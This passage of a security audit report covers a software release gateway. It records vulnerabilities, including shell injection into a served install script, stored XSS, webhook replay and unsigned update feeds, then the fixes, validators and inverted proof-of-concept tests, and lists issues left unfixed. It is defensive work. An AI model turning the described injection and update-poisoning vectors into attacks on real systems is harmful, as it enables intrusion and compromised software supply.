hop. The real gap is the missing `redirect: "manual"` on the _second_ hop — recorded as
**R6-09**.

**`stripMarkdown` as an XSS vector.** — **Not currently exploitable.** It is correctly _not_ a
sanitiser, but `summary` terminates in a JSON response and no in-repo consumer renders it as
HTML. Recorded as a hazard note under **R6-13**.

**"Sparkle client-side pinning saves the poisoned-update path."** — **Partly true, and it does
not rescue the platform.** Sparkle 2 verifies against the app-embedded `SUPublicEDKey`, so the
auto-update path is protected _by the client_. But the platform contributes no defence in
depth, `requireSparkleSignature:false` silently degrades non-pinning clients, and the direct
`/dmg` download path has no signature involvement whatsoever. See **R6-03**.

---

## Reproducing

```sh
export PATH="$HOME/.local/share/mise/installs/node/22/bin:$PATH"
cd packages/worker
npx vitest run test/attack/R6-release.test.ts     # 23 passed
```

Full worker suite at the time of writing: **573 passed, 6 failed** — all six failures are in
`test/attack/R9-injection.test.ts` (a different lane's file); `R6-release.test.ts` is green.

---

## Remediation

Landed on branch `full-security-audit-licensing`. Every PoC in
`packages/worker/test/attack/R6-release.test.ts` was **inverted in place** — the `it()` names are
unchanged so they still map to the finding ids, but each now asserts the attack _fails_. A
`// FIXED (R6-nn)` or `// NOT FIXED` comment heads each one.

**Verification:** `pnpm --filter @polaris-key/worker test` → **635 passed / 0 failed** (38 files);
`pnpm --filter @polaris-key/manifest test` → **18 passed / 0 failed**; `typecheck` clean on both.
`@polaris-key/manifest` must be rebuilt (`pnpm --filter @polaris-key/manifest build`) before the
worker suite sees manifest changes — the worker resolves it to `dist/`.

### R6-01 — `install.sh` RCE — **Fixed**

Two independent layers, as the fix direction called for.

1. **Ingest** (`packages/shared-manifest/src/index.ts`). A new `releaseString()` validator
   enforces a character class on every release string that reaches a shell, a URL path, or a
   RegExp source, and **rejects the whole manifest** (never coerces) on a miss:
   `binaryName` `^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$`, `ghOwner`/`ghRepo`
   `^[A-Za-z0-9][A-Za-z0-9._-]{0,99}$`, `channelWorkflow`
   `^(?:[0-9]{1,20}|[A-Za-z0-9._-]{1,100}\.ya?ml)$`, `betaBranch`
   `^[A-Za-z0-9._][A-Za-z0-9._/-]{0,254}$`, `summaryMarker`
   `^[A-Za-z0-9][A-Za-z0-9._:/-]{0,63}$`, `sparkleEd25519Pub` `^[A-Za-z0-9+/=_-]{1,512}$`.
   Empty/absent still means "unset" (the worker substitutes its default). This is the "audit the
   other strings" half of the ask: `ghOwner`/`ghRepo` were interpolated **unencoded** into
   `api.github.com` paths, and `summaryMarker` is embedded in a RegExp source (escaped, but
   unbounded).
2. **Render** (`release/install.ts`). Added `shQuote()` (a real POSIX single-quoter, `'` →
   `'\''`) and `validateInstallContext()`. `ORIGIN=`/`CLI_BASE=` are now emitted as
   shell-quoted literals rather than double-quoted interpolations; `binaryName` stays a literal
   but only because it is charset-proven at both ends. `renderInstallScript()` returns `null`
   for anything unsafe and `handleInstall` serves a 404 — the served installer is never built
   from a value the renderer cannot prove safe.
3. **Persist** (`release/linkRepo.ts`, `release/resync.ts`). `isSafeBinaryName()` gates the
   `INSERT`/`UPDATE`. This matters because `binaryName` falls back to the **repo name**, which
   does not pass through the manifest validator.

_Note on `origin`:_ the WHATWG URL host grammar permits `` ` `` and `$`, so a `Host` header
could previously have injected a command substitution into `ORIGIN="…"`. `shQuote` + `ORIGIN_RE`
close that even though R6-11 itself is unfixed.

**Tests:** R6-01 × 3 (all inverted; the end-to-end one now asserts the resync _rejects_ the
manifest with `release.binaryName must match` and `binary_name` stays `acme`), plus 4 new cases
in `packages/shared-manifest/src/index.test.ts`.

### R6-02 — no integrity verification — **Fixed**

`install.ts` now emits a fail-closed verification block **before** `chmod +x`/`mv`: it fetches
`"$URL?checksum=sha256"`, and refuses to install if the checksum is empty, if no SHA-256 tool
(`shasum` / `sha256sum` / `openssl dgst`) exists, or if the digests differ. The gateway serves
that checksum from a new `?checksum=sha256` representation of the artifact route
(`handleChecksum` in `release/index.ts`), which reads the pipeline-published `<asset>.sha256`
release asset, extracts **only** the 64-hex digest (so no repo-controlled bytes reach the
script), and 404s when no sidecar exists — which makes the script abort.

The false "the binary is expected to be notarized" claim at `install.ts:12` is **deleted** and
replaced with the accurate statement that `curl`-downloaded files never get
`com.apple.quarantine`, so Gatekeeper is not consulted on this path.

_Deliberately not done:_ a signed `SHA256SUMS` with a pinned minisign/cosign key. The `.sha256`
is served over TLS by the same gateway that serves the binary, so it defends against a GitHub
release-asset swap and transport tampering, **not** against a Worker or D1 compromise. That
residual is called out here rather than silently claimed as closed.

_Route note:_ `?checksum=sha256` was chosen over a `.sha256` path suffix specifically to stay
inside this lane's scope — a path suffix needs `src/router.ts` **and** `src/index.ts` (the route
plumbing) to carry a new field, both owned elsewhere. If the lead prefers the path form, it is a
~6-line follow-up in those two files plus one line in `install.ts`.

**Tests:** R6-02 (inverted: asserts the primitives are present and ordered before `chmod +x`,
and that "notariz" no longer appears) plus a new sibling test covering the `?checksum=sha256`
endpoint in both the present and absent cases.

### R6-03 — Sparkle signature relayed, not verified — **Fixed (both halves)**

1. **Real verification.** New `packages/worker/src/release/sparkle.ts`:
   `verifySparkleSignature()` base64-decodes the configured key (must be exactly 32 bytes) and
   the sidecar (must be exactly 64 bytes), imports it via
   `crypto.subtle.importKey("raw", …, {name:"Ed25519"})`, fetches the DMG's bytes
   (`fetchAssetBytes`, capped at 256 MiB), and `crypto.subtle.verify`s. It returns `false` —
   never throws — for every failure mode, so `handleAppcast` fails closed uniformly. A positive
   verdict is memoised in KV under `pk(product,"sparkle-sig",sha256(assetId|sig|pubkey))` with a
   24 h TTL, so a 200 MB DMG is not re-downloaded on every 300 s-cached appcast request; the key
   covers every input, so a swapped asset or key can never reuse an old verdict.
   `handleAppcast` drops the item and 404s when verification fails.
2. **Kill switch removed.** `requireSparkleSignature` is **deleted from
   `ManifestReleaseArtifactPolicy`** and from `normalizeArtifactPolicy`, so a `.pkey/release.*`
   push can no longer write it into `artifact_policy_json` at all. The column is now
   operator-owned: `artifactPolicy()` still honours an operator-set `false`, and defaults to
   required. This is a smaller change than the `fingerprint_policy_source` pattern the fix
   direction suggested and needs no migration.

**Tests:** R6-03 × 2 inverted (bogus `.sig` → 404, `requireSparkleSignature:false` no longer
reaches the column and the unsigned feed 404s), plus a new positive test proving a _genuine_
signature over the DMG bytes still renders — i.e. this is verification, not blanket denial.
`release.test.ts`'s "generates an appcast reading the sibling .sig asset" was rewritten to use a
real Ed25519 keypair and a real signature (the `"SIG_BASE64=="` fixture is exactly what R6-03
was about).

**Follow-up (P0-10): streaming verification.** `fetchAssetBytes` read the whole DMG with
`res.arrayBuffer()` before checking its size, against a 256 MiB cap inside a 128 MB isolate, so a
large DMG was an uncatchable out-of-memory crash rather than a clean 404. It is replaced by
`fetchAssetStream` plus `streamingEd25519Verify` (`services/release/ed25519Stream.ts`): the
SHA-512 of `R || A || M` is computed incrementally (`node:crypto`) as the body streams, and the
PureEdDSA equation is finished with `@noble/curves` (pinned `2.4.0`, a new Worker runtime
dependency: a T6 supply-chain surface, accepted because it is audited and dependency-free apart
from `@noble/hashes`). Strictness does not loosen: `S ≥ L`, non-canonical or undecodable points and
small-order keys are refused, and the equation is cofactorless; a property test checks agreement
with WebCrypto on 200 random cases and the RFC 8032 §7.1 vectors. The cap is now GitHub's 2 GiB
asset maximum, enforced while streaming whatever `Content-Length` says, and the verdict memo's TTL
is 30 days (the key covers every input and a re-uploaded asset gets a new id).
Because a miss is now a full DMG download of up to 2 GiB rather than a refusal past 256 MiB, a
_final_ negative verdict is memoised too (`"0"`, 24 h TTL): the appcast is unauthenticated and
its 404 is not edge-cached, so without it every cache-missing `GET /<p>/appcast.xml` for a release
whose signature fails (a rotated key, a `.sig` made before stapling, a bogus sidecar from a repo
writer) would re-download and re-hash the DMG, limited only by the 30/min per-IP metadata limiter.
The verifier reports `valid` / `invalid` / `incomplete`; only the first two are memoised, so a
mid-stream transport failure or a body past the cap is retried rather than pinned. Residual: the
memo only helps once a verdict lands. There is no single-flight, so every miss that arrives
while a stream is in flight (or before the verdict has propagated through KV, up to ~60 s per
colo) pays its own full download; and verification runs inline rather than under
`ctx.waitUntil`, so a request that the client aborts, or that hits the CPU limit, never
memoises — a client that aborts each request just before the end can repeat a near-2 GiB
upstream read up to the 30/min per-IP `release` limit. Publish-time verification (P3-03) removes
this from the unauthenticated request path. See R10-05 for the cost model.

_Not done:_ fix direction #3, signing/verifying on the direct `/dmg` path. The DMG bytes are
never rewritten by the gateway and Sparkle pins client-side, so the marginal gain over the
appcast check did not justify a full-artifact hash on every download.

### R6-04 — stored XSS via relayed `Content-Type` — **Fixed**

`streamAsset` (`release/github.ts`) takes a new required `StreamAssetOptions`:

- `Content-Type` is **removed from the relay allowlist** and set from `opts.contentType`, which
  the caller picks from the gateway's own allowlist (`application/octet-stream` for CLI
  binaries, `application/x-apple-diskimage` for DMGs). The upstream, repo-chosen value is never
  copied.
- `Content-Disposition: attachment; filename="…"` is **always** sent, with the filename passed
  through `sanitizeFilename()` (`[^A-Za-z0-9._-]` → `_`, leading dots stripped, 128-char cap).
- `X-Content-Type-Options: nosniff` on the streamed response.

Separately, `handleRelease` now wraps **every** return through `harden()`, which applies
`appSecurityHeaders()` — so `nosniff`, `x-frame-options: DENY`, the CSP, `referrer-policy` and
`permissions-policy` are on artifacts, appcasts, `/version`, `/changelog`, `install.sh`, the new
checksum endpoint, and every 404/401 on the surface. `appSecurityHeaders` was previously applied
nowhere under `release/`.

**Tests:** R6-04 × 2 inverted (`content-type: application/octet-stream`,
`content-disposition: attachment; filename="djdl-arm64"`, `nosniff`, CSP, `DENY` present on both
the artifact and the installer).

### R6-05 — attacker-supplied `ref` — **Fixed**

`resyncRepo()`'s `ref` parameter is **deleted**. `readPkeyFile` calls `fetchRepoFile` with no
`ref`, so the Contents API serves the DB-configured repo's own default branch, resolved by
GitHub — nothing caller- or payload-supplied appears in the path. `githubWebhook.ts` no longer
passes `payload.after`.

This is why no extra `GET /repos/{o}/{r}` round-trip was added: omitting the ref _is_ "resolve
from the DB-configured repo's default branch", with one fewer API call and one fewer failure
mode. `payload.after` is still recorded in `product_sync_state.commit_sha` as delivery metadata
only; it no longer selects content.

The payload's branch gate is reduced to a structural `payload.ref.startsWith("refs/heads/")`
check. It is documented in-code as a **hint, not a control** — a forged `default_branch` can now
only cause a redundant resync of the _correct_ default-branch content.

Installation binding added: `payload.installation.id` is compared against each product's stored
`release_config.gh_installation_id`; a mismatch (or an absent id) refuses that product with
`installation id does not match the linked repo` and no GitHub call is made. This is the
surviving part of refuted-H2 — one webhook secret covering every installation.

**Tests:** the `?ref=` PoC inverted (asserts no `ref=` appears on any Contents call), plus a new
`a delivery for the wrong installation id is refused` case proving no manifest is fetched and an
operator's quarantine survives. `linkRepo.test.ts`'s webhook test was updated accordingly (its
name changed from "pins the push SHA" to "reads .pkey from the default branch" — pinning to a
payload SHA _was_ the bug).

### R6-06 — replay — **Fixed**

`X-GitHub-Delivery` is now required (400 without it) and recorded in KV under
`pk("_platform","gh-delivery",<guid>)` with a 7-day TTL, **after** signature verification so an
unauthenticated flood cannot fill KV. A repeat GUID short-circuits to
`200 {ok:true, ignored:"duplicate-delivery"}` before any resync. `_platform` is not a legal
product slug (`^[a-z0-9-]+$`), so the scope cannot collide with a tenant.

**Tests:** the REPLAY PoC inverted — the second POST of identical bytes returns
`ignored: "duplicate-delivery"`, the operator's `incident-lockdown` tier survives, and
`binary_name` stays `acme-quarantined`.

_Not done:_ per-IP / per-repo rate limiting on the route (fix direction #3). That belongs with
the R10 lane's `rateLimit.ts` / `RL` Durable Object work, not here.

### R6-07 — `channel_workflow` unencoded — **Fixed**

`encodeURIComponent(cfg.channel_workflow)` at both call sites, matching `beta_branch` on the
same line; `pr.head.sha` is encoded too. Added `Array.isArray(data.workflow_runs)` before the
loop — the off-shape response was itself a reliable unhandled `TypeError` → 500.

**Tests:** the R6-07 PoC inverted (no call normalises onto `/orgs/attacker-org/repos`; the
workflow name stays one percent-encoded segment; the route 404s instead of throwing). The
duplicate PoCs in the R9 lane's file — `R9-03` × 2 — were inverted the same way, since this fix
is what breaks them.

### R6-08 / R9-14 — arch aliases and the dead catch — **Fixed**

- `normalizeArch()` added to `release/assets.ts` and applied in `handleBinary`, so `aarch64` →
  `arm64` and `amd64` → `x86_64` before the value can key `ARCH_TOKENS[…]` as `undefined`.
  `archMatches` also got a defensive `if (!wanted) return false`. Done in `release/` rather than
  `router.ts` to keep the change inside this lane.
- Every branch of `handleRelease`'s switch is now `return harden(await handler(…))`. `return
<promise>` inside a `try` in an `async` function resolves _after_ the try exits, so the
  `NotFoundError → notFound()` mapping was dead for every async surface and a private/absent
  release 500'd instead of 404'ing — leaking repo existence.

**Tests:** R6-08 × 4 inverted; the R10 lane's duplicate `R10-02` × 2 and the R9 lane's `R9-14`
inverted for the same reason.

### R6-10 — downgrade protection — **Fixed**

Fixed later, in work package P0-02 of the Godot omniplatform program, as the feature the table
below said it needed: a migration and an admin surface.

- **Floor.** A new table, `release_channel_floors` (migration 0023), holds the highest
  version each moving channel (`stable`, `beta` without a channel workflow, manual channels;
  never a pinned `X.Y.Z`, never `pr-<n>`) has resolved to during a truth-store sync. Only the sync raises it; the request path never writes it.
- **Enforcement.** `resolveMovingSelector` (`services/release/gateway.ts`) is the one resolution
  function the download route, the appcast, `/version` and `checkReleaseHealth` share. When the
  pick lands below the floor it looks the floor's release up by tag (one GitHub call): still
  there (it sat on a page not read) ⇒ serve it; gone ⇒ `404 no release for selector`, so no
  `cache-control: public` downgrade is ever emitted. The truth-store channel row refuses the
  same downgrade and records `release_health` as `blocked`.
- **Health.** `checkReleaseHealth` reports a `channel-regressed` check (error) naming the floor
  and what the list now offers. The follow-up lookup for a non-stable floor is guarded: a quota
  refusal or upstream failure there becomes a `channel-floor-unverified-<channel>` warning, so a
  GitHub hiccup never turns the health report into a 500.
- **Operator override.** `POST /manage/api/products/<slug>/release/channels/<channel>/floor`
  with `{ "version": "1.0.0" }` lowers the floor (never raises it) and `{ "clear": true }`
  removes it; both are audited as `release.channel.floor`.

The fix direction's "compare against a client-reported version" half is not done: no client
version is accepted on these routes, and the floor alone closes the deleted-release primitive.
The floor table is a stop-gap that P2-03 folds into `release_channel_policy.min_supported`.

**Tests:** the R6-10 PoC is now a regression test, `it("FIXED: once a sync has seen v2.0.0,
deleting it 404s latest until an operator lowers the floor")`. It gains the sync step the PoC
never had (without a sync there is no floor), then asserts `/version` 404s without a public
cache header, health reports `channel-regressed` naming `2.0.0` and `v1.0.0`, and after the
admin endpoint lowers the floor `v1.0.0` serves. `test/releaseResolution.test.ts` covers the
floor's raise-only behaviour and the still-listed-elsewhere case.

### Deliberately NOT fixed (PoCs left green on purpose)

| ID       | Why                                                                                                                                                                                                                                                                                                                                                                                       |
| -------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| R6-09    | `streamAsset`'s relative-`Location` `TypeError` and the unguarded second hop. Out of the assigned set; reaching hop 2 needs GitHub itself to 302 into a chain. ~15 lines in `github.ts` (try/catch → `NotFoundError`, plus `redirect:"manual"` and a bounded re-check loop) when scheduled.                                                                                               |
| R6-11    | Origin from the `Host` header. Needs a `PUBLIC_ORIGIN` var + `wrangler.toml`, both outside this lane. **Partially mitigated**: `ORIGIN_RE` + `shQuote` mean a hostile Host can no longer inject shell, only a wrong URL.                                                                                                                                                                  |
| R6-12    | Portal `/download/<token>` open redirect + TOCTOU lives in `portal/api.ts`, another owner. Still dormant (nothing writes `release_artifacts.source_url`).                                                                                                                                                                                                                                 |
| R6-13    | CDATA breakout in `renderAppcast`. One-line fix, but unreachable (no caller supplies `descriptionHtml`) and flipping it would churn another lane's expectations for no live gain.                                                                                                                                                                                                         |
| R6-14    | `commits[]` truncation. Fails closed (stale, not poisoned). The clean fix is fix direction #3 of R6-05 (resync unconditionally for linked repos), which is a behaviour change worth doing with R6-05 #4.                                                                                                                                                                                  |
| R6-05 #4 | Splitting `.pkey/` into "repo may own" vs "admin only" (`oidc`, `metadata_access`/`artifacts_access`, `admin_group`) with an approval step. The largest remaining item on this surface, and a design decision rather than a patch. Its PoC (`a webhook push rewrites OIDC issuer/clientId, tiers, and admin_group from the repo`) is intentionally still green and marked `// NOT FIXED`. |
